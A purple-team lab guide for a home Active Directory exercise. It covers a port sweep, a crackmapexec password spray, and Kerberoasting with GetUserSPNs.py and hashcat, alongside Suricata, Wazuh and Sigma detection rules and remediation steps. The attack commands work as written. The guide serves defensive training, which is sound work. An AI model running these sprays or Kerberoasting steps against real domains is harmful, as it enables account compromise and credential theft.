# Project Cerberus — Day 2 Implementation Guide
## Phase 1 (Initial Access — T1110) & Phase 2 (Credential Theft — T1558.003)

Instructions are organized by **role** (Team A / Team B): Team A owns Kali and executes every attack step; Team B owns the Monitoring instance, DC, and Workstation, and handles detection plus remediation on those machines. Each phase is split into **Pre-Attack**, **During-Attack**, and **Post-Attack**, done in that order, with verification at each boundary before moving on.

**Do not skip Pre-Attack steps to save time.** Team B's detection literally cannot fire if the audit policy or log forwarding isn't configured first — that has to happen before Team A executes, not after.

---

# PHASE 1 — Initial Access: Password Spray + Port Sweep

## TEAM B (Blue Team) — Pre-Attack

1. Confirm Suricata, Zeek, and the Wazuh manager are all still healthy (from Day 1):
   ```bash
   sudo systemctl status suricata zeek-related-service wazuh-manager
   ```
2. **Write the Suricata detection rule now, before the attack, so you understand what it's looking for.** Create a local rule file:
   ```bash
   sudo nano /var/lib/suricata/rules/local.rules
   ```
   Add:
   ```
   alert tcp any any -> $HOME_NET any (msg:"CERBERUS - Possible port sweep from single source"; flags:S; threshold: type both, track by_src, count 20, seconds 10; classtype:network-scan; sid:1000001; rev:1;)
   ```
   This fires when one source opens SYN connections to 20+ ports within 10 seconds — tune the `count`/`seconds` values after you see real traffic if it's too sensitive or not sensitive enough.
   Reference it in `suricata.yaml` under `rule-files:` (add `- local.rules`), then:
   ```bash
   sudo systemctl restart suricata
   ```
3. **Confirm the Windows auth-failure event (4625) is actually reaching Wazuh.** On both the DC and Workstation, check `ossec.conf` has a block for the Security channel (not just Sysmon):
   ```xml
   <localfile>
     <location>Security</location>
     <log_format>eventchannel</log_format>
   </localfile>
   ```
   Restart the agent on each machine if you had to add this.
4. **Write/confirm the Wazuh correlation rule** for repeated failures. Wazuh's default ruleset already has a base rule for Windows logon failure (event ID 4625) — check what rule ID it maps to in your version via the dashboard's Rules interface, or add a custom one in `/var/ossec/etc/rules/local_rules.xml`:
   ```xml
   <group name="local,cerberus,">
     <rule id="100010" level="10" frequency="5" timeframe="120">
       <if_matched_sid>60122</if_matched_sid>
       <description>CERBERUS - Multiple Windows logon failures, possible password spray (T1110)</description>
       <mitre>
         <id>T1110</id>
       </mitre>
     </rule>
   </group>
   ```
   (Replace `60122` with whatever the actual base 4625 rule ID is in your installed ruleset — check Dashboard → Server Management → Rules, search "logon failure".) Restart the manager after editing:
   ```bash
   sudo systemctl restart wazuh-manager
   ```
5. Confirm your dashboard shows **zero alerts** right now (baseline, quiet state) before Team A starts.

**Verification before proceeding:** both the Suricata rule and Wazuh correlation rule are deployed and services restarted cleanly, with no errors in `sudo systemctl status suricata` / `wazuh-manager`.

---

## TEAM A (Red Team / Attacker) — Pre-Attack

1. Power on Kali. Confirm networking:
   ```bash
   ping -c3 192.168.1.20   # DC
   ping -c3 192.168.1.21   # Workstation
   ping -c3 192.168.1.10   # Monitoring VM
   ```
2. Confirm/install tooling already on Kali: `nmap`, `crackmapexec` (or `netexec`, its actively maintained successor).
3. Build a small, realistic username list (coordinate with whoever has AD access — a handful of standard domain users plus one deliberately weak one is enough for the demo):
   ```
   admin
   jsmith
   svc-backup
   ```
4. Build a small password list containing 3–5 common weak passwords, including the one you know is correct for at least one demo account (so the spray has a guaranteed hit to show detection + a clean before/after story).

**Verification before proceeding:** connectivity confirmed to all three targets, tooling installed, lists ready.

---

## TEAM A (Red Team / Attacker) — During-Attack

1. **Port sweep** — run against the DC, Workstation, *and* the monitoring VM (this last one is what gives Suricata genuine traffic to alert on, per the earlier network fix):
   ```bash
   nmap -sS -T4 -p 1-1000 192.168.1.20
   nmap -sS -T4 -p 1-1000 192.168.1.21
   nmap -sS -T4 -p 1-1000 192.168.1.10
   ```
2. **Password spray** — low-and-slow (a couple of attempts per account, spread across many accounts, to reflect how real spraying avoids lockout thresholds):
   ```bash
   crackmapexec smb 192.168.1.20,192.168.1.21 -u users.txt -p passwords.txt --continue-on-success
   ```
3. Note the exact timestamps of both actions — Team B will need these to correlate against what fired.

**Verification:** confirm the spray actually authenticated successfully against at least one account (a `[+]` result in crackmapexec output) — you want a real "compromise" to carry into Phase 2.

---

## TEAM B (Blue Team) — During-Attack

1. Watch Suricata alerts live:
   ```bash
   tail -f /var/log/suricata/eve.json | grep alert
   ```
2. Watch the Wazuh dashboard (**Threat Hunting / Security Events**) filtered to the last 15 minutes — confirm your custom correlation rule (rule ID 100010, or whatever you set) fires with a description matching "possible password spray."
3. Screenshot both the Suricata alert and the Wazuh correlation alert — this is your evidence for the report and interview.

**Verification:** both alerts fired, and their timestamps line up with Team A's logged attack times.

---

## TEAM B (Blue Team) — Post-Attack (Remediation)

Per the original phase design: firewall auto-block + temporary account lockout.

1. **Account lockout policy** (if not already set) — on the DC:
   ```powershell
   net accounts /lockoutthreshold:5 /lockoutduration:15 /lockoutwindow:15
   ```
   This locks an account for 15 minutes after 5 failed attempts within a 15-minute window.
2. **Manual firewall block** (simplest, fastest for your timeline) — block Kali's IP on the DC and Workstation:
   ```powershell
   New-NetFirewallRule -DisplayName "Block-Kali-Cerberus" -Direction Inbound -RemoteAddress 192.168.1.22 -Action Block
   ```
   *(Optional stretch, if time allows: configure Wazuh Active Response to run this automatically when rule 100010 fires — worth mentioning as a "future work" item in your report even if you don't implement it given the deadline.)*
3. **Re-test:** have Team A attempt the same spray again — it should now fail outright (blocked) or lock the account after a few attempts, rather than succeeding.

**Verification:** confirmed the account locks and/or the source IP is blocked; a repeat spray attempt fails.

---

## Both Teams — Phase 1 Sigma Rule (write together, or Team B writes with Team A reviewing)

Hand-write this now while the attack/detection is fresh:
```yaml
title: Possible Password Spray via Repeated Windows Logon Failures
id: 8f1e1a10-cerberus-phase1
status: experimental
description: Detects multiple Windows logon failures (Event ID 4625) from a single source within a short window, indicative of password spraying (T1110).
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4625
  timeframe: 2m
  condition: selection | count() by IpAddress > 5
falsepositives:
  - Legitimate user repeatedly mistyping password
  - Service account misconfiguration causing repeated auth attempts
level: high
tags:
  - attack.credential_access
  - attack.t1110
```

---

# PHASE 2 — Credential Theft: Kerberoasting

## Account Setup (do this first — whoever has DC admin access)

Create the deliberately vulnerable Kerberoastable service account:
```powershell
New-ADUser -Name "svc-sql" -SamAccountName "svc-sql" `
  -AccountPassword (ConvertTo-SecureString "Summer2024!" -AsPlainText -Force) `
  -Enabled $true -PasswordNeverExpires $true

setspn -A MSSQLSvc/cerberus-dc.cerberus.local:1433 cerberus\svc-sql
```
`Summer2024!` is deliberately chosen because it's a pattern common enough to appear in standard cracking wordlists (`rockyou.txt`) — this is intentional, so the crack succeeds cleanly for the demo (see reasoning at the top of this document).

Also confirm you have at least one **low-privilege standard domain user** account to run the Kerberoasting query from (Kerberoasting only requires *any* authenticated domain account, not admin rights) — reuse the account Team A compromised in Phase 1 if that succeeded, since it ties the two phases together nicely in your narrative.

---

## TEAM B (Blue Team) — Pre-Attack

1. **Enable Kerberos service ticket auditing on the DC** — this is the event source Phase 2 detection depends on entirely, and it's off by default:
   ```powershell
   auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable
   ```
   Verify:
   ```powershell
   auditpol /get /subcategory:"Kerberos Service Ticket Operations"
   ```
2. Confirm the DC's Wazuh agent is forwarding the Security channel (same `<localfile>` block as Phase 1 — if you already added it, no action needed).
3. **Write the detection rule** for RC4-encrypted service ticket requests (the Kerberoasting signature — real Kerberos traffic normally uses AES; RC4 usage on a ticket request is the tell):
   ```xml
   <group name="local,cerberus,">
     <rule id="100020" level="12">
       <if_group>windows</if_group>
       <field name="win.system.eventID">^4769$</field>
       <field name="win.eventdata.ticketEncryptionType">^0x17$</field>
       <description>CERBERUS - Possible Kerberoasting: RC4 service ticket requested (T1558.003)</description>
       <mitre>
         <id>T1558.003</id>
       </mitre>
     </rule>
   </group>
   ```
   **Note:** the exact field name Wazuh uses for ticket encryption type can vary by version/decoder — before finalizing, generate one real 4769 event (see verification below) and check the actual field name in the dashboard's Discover view under that event, then adjust the rule to match exactly.
4. Restart the manager:
   ```bash
   sudo systemctl restart wazuh-manager
   ```

**Verification before proceeding:** `auditpol` confirms Kerberos Service Ticket auditing is on, and the custom rule is loaded without errors (`sudo /var/ossec/bin/wazuh-logtest` can validate rule syntax if you want to be thorough).

---

## TEAM A (Red Team / Attacker) — Pre-Attack

1. Confirm Impacket is installed on Kali:
   ```bash
   pip show impacket
   ```
2. Confirm you have the low-privilege domain credentials to authenticate with (from Phase 1, or provisioned separately).
3. Confirm DNS resolution of the domain from Kali (needed for Kerberos to work correctly):
   ```bash
   nslookup cerberus.local 192.168.1.20
   ```

**Verification:** DNS resolves, credentials in hand.

---

## TEAM A (Red Team / Attacker) — During-Attack

1. **Enumerate Kerberoastable accounts:**
   ```bash
   GetUserSPNs.py cerberus.local/lowpriv_user:'password' -dc-ip 192.168.1.20 -request
   ```
   This should list `svc-sql` and output its TGS ticket hash directly.
2. **Save the hash** to a file (`svc-sql.hash`).
3. **Crack it offline** with hashcat, using rockyou.txt:
   ```bash
   hashcat -m 13100 svc-sql.hash /usr/share/wordlists/rockyou.txt
   ```
4. Confirm the crack succeeds and note the recovered plaintext password — screenshot this, it's a strong piece of portfolio evidence.

**Verification:** hashcat reports the cracked password matching `Summer2024!`.

---

## TEAM B (Blue Team) — During-Attack

1. Watch the dashboard for rule 100020 firing, tied to Event ID 4769 with RC4 encryption, for the `svc-sql` account.
2. Screenshot the alert, noting the timestamp against Team A's `GetUserSPNs.py` execution time.

**Verification:** alert fired and timestamps correlate with the attack.

---

## TEAM B (Blue Team) — Post-Attack (Remediation)

Per the original phase design: deploy gMSA, rotate credentials with AES encryption.

1. **Create the KDS root key** (one-time, needed for gMSA — note it can take up to 10 hours to fully propagate in a real multi-DC environment, but in a single-DC lab you can force immediate use):
   ```powershell
   Add-KdsRootKey -EffectiveTime ((Get-Date).AddHours(-10))
   ```
2. **Create the gMSA** to replace the vulnerable service account:
   ```powershell
   New-ADServiceAccount -Name "gmsa-sql" -DNSHostName "cerberus-dc.cerberus.local" -PrincipalsAllowedToRetrieveManagedPassword "CERBERUS-DC$"
   Install-ADServiceAccount -Identity "gmsa-sql"
   ```
3. **Alternative/additional fix on the original account** — force AES-only Kerberos encryption so even if someone requests a ticket, it can't be requested with RC4 anymore:
   ```powershell
   Set-ADUser -Identity svc-sql -KerberosEncryptionType AES128,AES256
   ```
4. **Re-test:** have Team A re-run `GetUserSPNs.py` against `svc-sql` — the returned ticket should now show AES encryption, and attempting to crack it with `-m 13100` (the RC4-etype hashcat mode) should fail outright since the hash format no longer matches.

**Verification:** re-run of the attack shows AES encryption in the ticket, and the RC4-based cracking approach no longer applies.

---

## Both Teams — Phase 2 Sigma Rule

```yaml
title: Kerberoasting - RC4 Service Ticket Request
id: 7c2b3f20-cerberus-phase2
status: experimental
description: Detects a Kerberos service ticket (TGS) request using RC4 encryption (etype 0x17), a strong indicator of Kerberoasting (T1558.003), since legitimate modern Kerberos traffic should use AES.
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4769
    TicketEncryptionType: '0x17'
  condition: selection
falsepositives:
  - Legacy applications or service accounts still configured for RC4 only
level: high
tags:
  - attack.credential_access
  - attack.t1558.003
```

---

# End-of-Phase 1 & 2 Checklist

- [ ] Suricata rule deployed and fired correctly on the port sweep
- [ ] Wazuh correlation rule fired on the password spray (Event 4625 pattern)
- [ ] Account lockout / firewall block implemented and re-tested successfully
- [ ] Phase 1 Sigma rule written
- [ ] Kerberos Service Ticket auditing enabled on the DC
- [ ] Wazuh rule fired on the RC4 ticket request (Event 4769)
- [ ] `svc-sql` password cracked successfully via hashcat (screenshot saved)
- [ ] gMSA deployed and/or AES-only enforced on `svc-sql`
- [ ] Re-test confirms the original attack no longer works post-remediation
- [ ] Phase 2 Sigma rule written
- [ ] Both teams have logged any issues hit today in the shared issue tracker

Once all boxes are checked, you're clear for Day 3 (Phase 3: C2 Beaconing, Phase 4: Defense Evasion).
